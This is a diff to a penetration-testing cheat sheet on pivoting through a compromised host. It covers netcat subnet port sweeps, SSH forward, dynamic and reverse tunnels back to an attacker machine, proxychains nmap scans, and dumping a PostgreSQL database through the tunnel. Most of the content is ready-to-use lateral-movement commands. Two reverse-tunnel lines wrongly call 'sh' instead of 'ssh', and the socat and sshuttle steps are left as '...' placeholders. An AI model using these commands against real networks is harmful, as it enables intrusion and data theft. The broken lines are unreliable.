@@ -58,13 +58,15 @@ Netcat port discovery:
 hacked_target$ for i in $(seq 1 254) ; do nc -zv -w 1 ${subnet}.${i} $Port; done # listen, verbose, timeout 1sec
 ```
 
-Ssh forward tunnel:
+#### Ssh forward tunnel
+
 ```
 DmzHost$ ssh -N -L 0.0.0.0:$PortDmzOut:$IpWindows:$PortWindows user@$IpDbOut
 Kali$ smbclient -p $PortDmzOut -L //$IpDmzOut/ -U someuser --password=somepass
 ```
 
-Ssh dynamic tunnel:
+#### Ssh dynamic tunnel
+
 ```
 DmzHost$ ssh -N -D 0.0.0.0:$PortDmzOut user@$IpDbOut
 Kali$ sudo vi /etc/proxychains4.conf
@@ -73,9 +75,51 @@ Kali$ proxychains smbclient -L //$IpWindows/ -U someuser --password=somepass
 Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn $IpWindows
 ```
 
-Ssh reverse tunnel:
+#### Ssh reverse tunnel
+
 ```
-ssh -N -R localhost:2345:$IpDmzIn:$PortDmzIn user@IpAttacker
+hackeduser@hackedtarget$ sh -N -R 127.0.0.1:$KaliPort:$IpDbIn:$PortDbIn user@IpAttacker # Only Kali will be able to use this tunnel...
+hackeduser@hackedtarget$ sh -N -R 0.0.0.0:$KaliPort:$IpDmzIn:$PortDmzIn user@IpAttacker # All IPs will be able to connect through $KaliPort on the Kali box
+```
+Check with `ss -lntpu` on Kali. Example of connection with PostGreSQL:
+```
+kali$ psql -h 127.0.0.1 -p $KaliPort -U postgre_user
+```
+then on the DB, as usual:
+```
+postgre=# \l
+postgre=# \c some_database
+postgre=# select * from some_table ;
+```
+
+#### Ssh dynamic reverse tunnel
+
+```
+hackeduser@hackedtarget$ ssh -N -R $KaliPort kaliuser@IpAttacker
+```
+then check with `ss -lntpu`, prepare a socks proxy on `/etc/proxychains4.conf`:
+```
+...
+socks5 127.0.0.1 $KaliPort
+```
+and scan the new target:
+```
+kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n $NewTargetIp
+```
+
+#### Sshuttle
+
+On the target:
+```
+hackeduser@hackedtarget$ socat ...
+```
+then run the sshuttle on Kali:
+```
+kali$ sshuttle -r ...
+```
+and test
+```
+kali$ smbclient -L //$IpWindows/ -U some_user --password=some_pass
 ```
 
 ### Windows
